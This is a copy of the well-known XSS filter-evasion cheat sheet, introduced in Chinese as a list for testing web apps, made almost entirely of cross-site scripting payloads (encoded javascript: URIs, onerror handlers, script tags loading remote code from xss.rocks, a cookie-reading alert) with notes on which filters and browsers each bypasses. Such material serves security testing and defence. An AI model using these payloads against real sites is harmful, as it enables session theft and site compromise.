# XSS 测试 cheatsheet

本文档为测试web应用客户端是否存在XSS漏洞提供了一个列表。内容参考：
- [Cross Site Scripting Prevention Cheat](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## Tests
下面的内容列出了一系列XSS攻击样本，用于绕过多种XSS防护过滤。注意：输入过滤是一种不完整的防护手段，下列示例可以说明这一点。

### Basic XSS Test Without Filter Evasion

```
&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;
```

### XSS Locator (Polygot)</h2>

```
javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;
```

### Image XSS using the JavaScript directive

```
&lt;IMG SRC="javascript:alert('XSS');"&gt;
```

### No quotes and no semicolon
```
&lt;IMG SRC=javascript:alert('XSS')&gt;
```
### Case insensitive XSS attack vector

```
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
```

### Grave accent obfuscation
```
&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
```

### Malformed A tags

```
\&lt;a onmouseover="alert(document.cookie)"\&gt;xxs link\&lt;/a\&gt;
```

### Malformed IMG tags
```
&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"\&gt;
```

### fromCharCode

```
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
```

### Default SRC tag to get past filters that check SRC domain
```
&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
```
### Default SRC tag by leaving it empty

```
&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
```

### Default SRC tag by leaving it out entirely
```
&lt;IMG onmouseover="alert('xxs')"&gt;
```
### On error alert

```
&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;
```

### IMG onerror and javascript alert encode
```
&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;
```

### Decimal HTML character references</h2>

```
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
```
### Decimal HTML character references without trailing semicolons
```
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
```

### Hexadecimal HTML character references without trailing semicolons
```
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
```
</code></pre>
<h2><a id="user-content-embedded-tab" class="anchor" aria-hidden="true" href="#embedded-tab"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Embedded tab</h2>
<p>Used to break up the cross site scripting attack:</p>
<pre><code>&lt;IMG SRC="jav	ascript:alert('XSS');"&gt;
</code></pre>
<h2><a id="user-content-embedded-encoded-tab" class="anchor" aria-hidden="true" href="#embedded-encoded-tab"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Embedded Encoded tab</h2>
<p>Use this one to break up XSS :</p>
<pre><code>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
</code></pre>
<h2><a id="user-content-embedded-newline-to-break-up-xss" class="anchor" aria-hidden="true" href="#embedded-newline-to-break-up-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Embedded newline to break up XSS</h2>
<p>Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:</p>
<pre><code>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
</code></pre>
<h2><a id="user-content-embedded-carriage-return-to-break-up-xss" class="anchor" aria-hidden="true" href="#embedded-carriage-return-to-break-up-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Embedded carriage return to break up XSS</h2>
<p>(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):</p>
<pre><code>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
</code></pre>
<h2><a id="user-content-null-breaks-up-javascript-directive" class="anchor" aria-hidden="true" href="#null-breaks-up-javascript-directive"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Null breaks up JavaScript directive</h2>
<p>Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use <code>%00</code> in the URL string or if you want to write your own injection tool you can either use vim (<code>^V^@</code> will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char <code>%00</code> is much more useful and helped me bypass certain real world filters with a variation on this example:</p>
<pre><code>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out
</code></pre>
<h2><a id="user-content-spaces-and-meta-chars-before-the-javascript-in-images-for-xss" class="anchor" aria-hidden="true" href="#spaces-and-meta-chars-before-the-javascript-in-images-for-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Spaces and meta chars before the JavaScript in images for XSS</h2>
<p>This is useful if the pattern match doesn't take into account spaces in the word <code>javascript:</code> -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the <code>javascript:</code> keyword. The actual reality is you can have any char from 1-32 in decimal:</p>
<pre><code>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;
</code></pre>
<h2><a id="user-content-non-alpha-non-digit-xss" class="anchor" aria-hidden="true" href="#non-alpha-non-digit-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Non-alpha-non-digit XSS</h2>
<p>The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example <code>\&lt;SCRIPT\\s</code> != <code>\&lt;SCRIPT/XSS\\s</code>:</p>
<pre><code>&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:</p>
<pre><code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
</code></pre>
<p>Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.</p>
<pre><code>&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</code></pre>
<h2><a id="user-content-extraneous-open-brackets" class="anchor" aria-hidden="true" href="#extraneous-open-brackets"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Extraneous open brackets</h2>
<p>Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:</p>
<pre><code>&lt;&lt;SCRIPT&gt;alert("XSS");//\&lt;&lt;/SCRIPT&gt;
</code></pre>
<h2><a id="user-content-no-closing-script-tags" class="anchor" aria-hidden="true" href="#no-closing-script-tags"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>No closing script tags</h2>
<p>In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the <code>\&gt;&lt;/SCRIPT&gt;</code> portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:</p>
<pre><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;
</code></pre>
<h2><a id="user-content-protocol-resolution-in-script-tags" class="anchor" aria-hidden="true" href="#protocol-resolution-in-script-tags"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Protocol resolution in script tags</h2>
<p>This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a <code>&lt;/SCRIPT&gt;</code> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ".j" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.</p>
<pre><code>&lt;SCRIPT SRC=//xss.rocks/.j&gt;
</code></pre>
<h2><a id="user-content-half-open-htmljavascript-xss-vector" class="anchor" aria-hidden="true" href="#half-open-htmljavascript-xss-vector"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Half open HTML/JavaScript XSS vector</h2>
<p>Unlike Firefox the IE rendering engine doesn't add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close "&gt;" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: <code>/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\&lt;)\[^\\n\]+((\\%3E)|\&gt;)/</code> because it doesn't require the end "&gt;". As a side note, this was also affective against a real world XSS filter I came across using an open ended <code>&lt;IFRAME</code> tag instead of an <code>&lt;IMG</code> tag:</p>
<pre><code>&lt;IMG SRC="`&lt;javascript:alert&gt;`('XSS')"
</code></pre>
<h2><a id="user-content-double-open-angle-brackets" class="anchor" aria-hidden="true" href="#double-open-angle-brackets"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Double open angle brackets</h2>
<p>Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:</p>
<pre><code>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;
</code></pre>
<h2><a id="user-content-escaping-javascript-escapes" class="anchor" aria-hidden="true" href="#escaping-javascript-escapes"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Escaping JavaScript escapes</h2>
<p>When the application is written to output some user information inside of a JavaScript like the following: <code>&lt;SCRIPT&gt;var a="$ENV{QUERY\_STRING}";&lt;/SCRIPT&gt;</code> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read <code>&lt;SCRIPT&gt;var a="\\\\";alert('XSS');//";&lt;/SCRIPT&gt;</code> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.:</p>
<pre><code>\";alert('XSS');//
</code></pre>
<p>An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:</p>
<pre><code>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;
</code></pre>
<h2><a id="user-content-end-title-tag" class="anchor" aria-hidden="true" href="#end-title-tag"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>End title tag</h2>
<p>This is a simple XSS vector that closes <code>&lt;TITLE&gt;</code> tags, which can encapsulate the malicious cross site scripting attack:</p>
<pre><code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
</code></pre>
<h2><a id="user-content-input-image" class="anchor" aria-hidden="true" href="#input-image"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>INPUT image</h2>
<pre><code>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
</code></pre>
<h2><a id="user-content-body-image" class="anchor" aria-hidden="true" href="#body-image"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>BODY image</h2>
<pre><code>&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
</code></pre>
<h2><a id="user-content-img-dynsrc" class="anchor" aria-hidden="true" href="#img-dynsrc"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>IMG Dynsrc</h2>
<pre><code>&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
</code></pre>
<h2><a id="user-content-img-lowsrc" class="anchor" aria-hidden="true" href="#img-lowsrc"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>IMG lowsrc</h2>
<pre><code>&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
</code></pre>
<h2><a id="user-content-list-style-image" class="anchor" aria-hidden="true" href="#list-style-image"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List-style-image</h2>
<p>Fairly esoteric issue dealing with embedding images for bulleted lists.
This will only work in the IE rendering engine because of the JavaScript
directive. Not a particularly useful cross site scripting vector:</p>
<pre><code>&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
</code></pre>
<h2><a id="user-content-vbscript-in-an-image" class="anchor" aria-hidden="true" href="#vbscript-in-an-image"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>VBscript in an image</h2>
<pre><code>&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
</code></pre>
<h2><a id="user-content-livescript-older-versions-of-netscape-only" class="anchor" aria-hidden="true" href="#livescript-older-versions-of-netscape-only"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Livescript (older versions of Netscape only)</h2>
<pre><code>&lt;IMG SRC="livescript:[code]"&gt;
</code></pre>
<h2><a id="user-content-svg-object-tag" class="anchor" aria-hidden="true" href="#svg-object-tag"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SVG object tag</h2>
<pre><code>&lt;svg/onload=alert('XSS')&gt;
</code></pre>
